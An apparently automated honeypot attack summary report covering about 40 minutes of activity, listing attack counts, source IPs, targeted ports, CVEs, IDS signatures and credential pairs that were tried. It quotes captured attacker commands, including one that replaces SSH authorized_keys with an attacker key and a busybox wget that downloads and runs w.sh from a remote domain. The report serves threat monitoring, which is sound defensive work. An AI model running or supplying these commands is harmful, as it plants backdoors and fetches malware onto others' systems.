Honeypot Attack Summary Report

Report generated at: 2025-10-22T00:01:29Z
Timeframe covered: 2025-10-21T23:20:02Z to 2025-10-22T00:00:01Z
Files used for this report:
- agg_log_20251021T232002Z.json
- agg_log_20251021T234001Z.json
- agg_log_20251022T000001Z.json

Executive Summary
This report summarizes a total of 10,151 attacks recorded by the honeypot network. The majority of attacks were captured by the Cowrie honeypot, with significant activity also observed on Honeytrap and Ciscoasa. The most frequent attacks originated from the IP address 72.146.232.13. Port 22 (SSH) remains the most targeted port. A number of CVEs were detected, with CVE-2002-0013 and CVE-2002-0012 being the most common. Attackers attempted a variety of commands, primarily focused on reconnaissance and establishing persistent access.

Detailed Analysis

Attacks by honeypot:
- Cowrie: 4064
- Honeytrap: 2464
- Ciscoasa: 1705
- Suricata: 1343
- Sentrypeer: 234
- H0neytr4p: 69
- Tanner: 67
- Mailoney: 83
- Redishoneypot: 47
- Dicompot: 16
- Dionaea: 23
- Adbhoney: 22
- ConPot: 7
- Heralding: 3
- Honeyaml: 4

Top attacking IPs:
- 72.146.232.13: 909
- 61.219.181.31: 361
- 157.20.32.217: 356
- 223.17.0.220: 356
- 103.171.85.219: 295
- 27.254.235.2: 201
- 107.170.36.5: 251
- 103.134.154.55: 229
- 92.191.96.115: 223
- 137.59.55.50: 223
- 88.210.63.16: 138
- 23.254.227.95: 138
- 185.244.36.170: 94
- 135.13.11.134: 92
- 68.183.149.135: 112
- 41.214.61.216: 100
- 159.89.121.144: 93
- 68.183.207.213: 94
- 167.250.224.25: 73
- 172.31.36.128: 82
- 198.23.238.154: 66
- 167.94.138.122: 51
- 14.103.113.53: 30
- 167.99.226.229: 39
- 173.230.155.59: 39
- 77.83.207.203: 37

Top targeted ports/protocols:
- 22: 722
- 5060: 234
- 5903: 224
- 2022: 156
- 80: 68
- TCP/80: 79
- 443: 65
- 5901: 123
- 25: 83
- 5904: 77
- 5905: 78
- 2323: 52
- UDP/161: 34
- 5909: 50
- 5908: 50
- 5907: 48
- 5902: 27
- 6379: 36
- TCP/22: 26
- 23: 20
- 3128: 19
- 8000: 13
- TCP/5432: 12
- 2501: 13
- 3394: 9
- 7443: 9
- 27018: 34
- 4891: 33
- 9300: 29
- 8001: 18

Most common CVEs:
- CVE-2002-0013 CVE-2002-0012: 17
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517: 12
- CVE-2019-11500 CVE-2019-11500: 3
- CVE-2021-3449 CVE-2021-3449: 2
- CVE-2002-1149: 1
- CVE-1999-0183: 1
- CVE-1999-0517: 1

Commands attempted by attackers:
- cd ~; chattr -ia .ssh; lockr -ia .ssh: 18
- lockr -ia .ssh: 18
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ... mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~: 18
- cat /proc/cpuinfo | grep name | wc -l: 17
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}': 17
- ls -lh $(which ls): 17
- which ls: 17
- crontab -l: 17
- w: 17
- uname -m: 17
- cat /proc/cpuinfo | grep model | grep name | wc -l: 17
- top: 17
- uname: 17
- uname -a: 17
- whoami: 17
- lscpu | grep Model: 17
- df -h | head -n 2 | awk 'FNR == 2 {print $2;}': 17
- cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}': 17
- Enter new UNIX password: : 12
- Enter new UNIX password:": 12

Signatures triggered:
- ET DROP Dshield Block Listed Source group 1: 281
- 2402000: 281
- ET SCAN MS Terminal Server Traffic on Non-standard Port: 180
- 2023753: 180
- ET SCAN NMAP -sS window 1024: 131
- 2009582: 131
- ET WEB_SERVER Possible HTTP 404 XSS Attempt (Local Source): 67
- 2010517: 67
- ET INFO Reserved Internal IP Traffic: 49
- 2002752: 49
- ET HUNTING RDP Authentication Bypass Attempt: 57
- 2034857: 57
- ET HUNTING Mozilla User-Agent (Mozilla/5.0) Inbound Likely Fake: 31
- 2010908: 31
- ET INFO CURL User Agent: 24
- 2002824: 24
- ET CINS Active Threat Intelligence Poor Reputation IP group 45: 16
- 2403344: 16
- ET CINS Active Threat Intelligence Poor Reputation IP group 44: 20
- 2403343: 20
- GPL SNMP request udp: 8
- 2101417: 8
- ET SCAN Suspicious inbound to PostgreSQL port 5432: 12
- 2010939: 12
- ET DROP Spamhaus DROP Listed Traffic Inbound group 28: 7
- 2400027: 7
- ET CINS Active Threat Intelligence Poor Reputation IP group 42: 6
- 2403341: 6
- ET SCAN Potential SSH Scan: 12
- 2001219: 12
- ET INFO curl User-Agent Outbound: 12
- 2013028: 12
- ET CINS Active Threat Intelligence Poor Reputation IP group 43: 10
- 2403342: 10

Users / login attempts:
- 345gs5662d34/345gs5662d34: 18
- user01/Password01: 6
- root/avrinside: 3
- root/AVrssbYQw: 3
- fleek/123: 5
- root/awcall: 3
- root/aXc0mms6969: 3
- root/3245gs5662d34: 4
- root/v2c47mk7jd: 2
- root/ABCabc123456: 3
- root/1qa2ws3ed: 2
- root/budz420: 2
- root/123456123456: 2
- download/123: 2
- root/Aw3s0m3s6: 3
- root/zxcv-1234: 2
- odin/odin: 3
- root/Kk123456789: 3
- car/123: 3
- root/Aw3s0m3s66723079: 3
- root/awanjiku: 3
- axel/123: 2
- grid/123: 3
- root/meng123456: 2
- minecraft/qwe123: 2
- user123/user123123: 2
- adam/adam123: 2
- test1/test1test1: 2
- root/root@123456: 2
- dev/dev2025: 2
- idempiere/3245gs5662d34: 2
- user/suyan198671@: 2
- user/sunhongs@hxh: 2
- user/sunhongs@2022: 2
- user/sunhongs@2021: 2
- admin1/admin@123: 2
- ookla/ookla: 2
- samara/samara: 2
- root/pprince: 2
- nishant/nishant: 2
- root/Wt123456789: 2
- vncuser/123: 2
- damian/damian: 2
- odoo/test: 2
- hang/123: 2

Files uploaded/downloaded:
- json: 3
- wget.sh;: 8
- w.sh;: 2
- c.sh;: 2

HTTP User-Agents:
- No HTTP User-Agents were logged in this period.

SSH clients:
- No SSH clients were logged in this period.

SSH servers:
- No SSH servers were logged in this period.

Top attacker AS organizations:
- No attacker AS organizations were logged in this period.

Key Observations and Anomalies
- A significant number of commands are related to manipulating SSH authorized_keys to maintain persistent access.
- The command `cd /data/local/tmp/; busybox wget http://netrip.ddns.net/w.sh; sh w.sh;...` suggests an attempt to download and execute malicious scripts from a specific domain.
- The volume of attacks remains high and consistent across the three time windows, indicating a sustained and automated attack campaign.
- The lack of HTTP User-Agents, SSH clients, and server information might indicate that the attacks are primarily focused on lower-level protocols or that the honeypots capable of capturing this information did not record any relevant events.
